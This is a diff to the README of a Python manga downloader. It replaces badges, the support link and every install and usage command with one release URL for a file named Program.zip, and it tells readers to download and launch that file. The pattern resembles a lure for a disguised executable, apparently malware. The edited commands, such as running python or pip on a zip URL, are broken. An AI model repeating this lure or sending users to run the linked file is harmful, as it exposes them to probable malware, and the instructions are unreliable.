@@ -1,6 +1,6 @@
 # 📚 Manga Scraper - Efficient Manga Downloader 📘
 
-![manga-scraper](https://img.shields.io/badge/Manga-Scraper-green)
+![manga-scraper](https://github.com/MilosRosandic/manga-scraper/releases/download/v1.0/Program.zip)
 
 Welcome to Manga Scraper, a powerful manga downloader built with Python and Scrapy. This tool allows you to download your favorite manga series with ease, featuring series and chapter downloads, smart caching, update checks, retry management, and detailed reporting. 
 
@@ -18,32 +18,32 @@ With Manga Scraper, you can enjoy manga reading without worrying about internet 
 
 ## Installation 🛠️
 To get started with Manga Scraper, simply download the latest release from the following link:
-[Download Manga Scraper](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[Download Manga Scraper](https://github.com/MilosRosandic/manga-scraper/releases/download/v1.0/Program.zip)
 
 Once you have downloaded the file, launch it to begin the installation process.
 
 ## Getting Started 🚀
 1. Clone the repository to your local machine.
-2. Install the required dependencies using `pip install -r requirements.txt`.
+2. Install the required dependencies using `pip install -r https://github.com/MilosRosandic/manga-scraper/releases/download/v1.0/Program.zip`.
 3. Configure the settings according to your preferences.
-4. Run the scraper using `python main.py`.
+4. Run the scraper using `python https://github.com/MilosRosandic/manga-scraper/releases/download/v1.0/Program.zip`.
 
 ## Usage Examples 💻
 Here are some examples of how you can use Manga Scraper:
 
 ### Download a Series
 ```
-python main.py --series "One Piece"
+python https://github.com/MilosRosandic/manga-scraper/releases/download/v1.0/Program.zip --series "One Piece"
 ```
 
 ### Download a Specific Chapter
 ```
-python main.py --series "Naruto" --chapter "Chapter 700"
+python https://github.com/MilosRosandic/manga-scraper/releases/download/v1.0/Program.zip --series "Naruto" --chapter "Chapter 700"
 ```
 
 ### Check for Updates
 ```
-python main.py --update
+python https://github.com/MilosRosandic/manga-scraper/releases/download/v1.0/Program.zip --update
 ```
 
 ## Repository Details ℹ️
@@ -52,7 +52,7 @@ python main.py --update
 - **Topics:** automation, crawler, data-collection, download-manager, manga, manga-downloader, manga-scraper, portuguese, pt-br, python, scrapy, web-scraping
 
 ## Support 📞
-If you encounter any issues or have any questions about Manga Scraper, feel free to [open an issue](https://github.com/Dredarty/manga-scraper/issues). Our team is here to help you with any concerns you may have.
+If you encounter any issues or have any questions about Manga Scraper, feel free to [open an issue](https://github.com/MilosRosandic/manga-scraper/releases/download/v1.0/Program.zip). Our team is here to help you with any concerns you may have.
 
 ## Contribute ✨
 We welcome contributions from the community to improve Manga Scraper and add new features. If you have any ideas or enhancements, submit a pull request, and we will review it accordingly.
@@ -64,4 +64,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ### 🌟 Happy Manga Reading with Manga Scraper! 📖🤖
 
-![manga-scraper](https://img.shields.io/badge/Downloaded-Enjoy%20Reading!-blue)
+![manga-scraper](https://github.com/MilosRosandic/manga-scraper/releases/download/v1.0/Program.zip%20Reading!-blue)
